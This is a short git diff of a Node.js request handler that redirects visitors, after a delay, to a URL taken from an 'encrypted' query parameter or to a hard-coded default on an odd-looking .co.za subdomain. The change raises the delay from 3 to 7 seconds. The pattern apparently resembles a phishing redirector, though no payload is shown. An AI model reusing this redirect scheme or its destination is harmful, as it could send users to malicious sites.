@@ -6,7 +6,7 @@ module.exports = (req, res) => {
     const defaultUrl = 'https://nlbnklko.voulastai.co.za/@KIdNRlwwaKTN/';
 
     // Delay time in milliseconds (e.g., 3000ms = 3 seconds)
-    const delay = 3000;
+    const delay = 7000;
 
     // If the 'url' query parameter is provided
     if (encryptedUrl) {
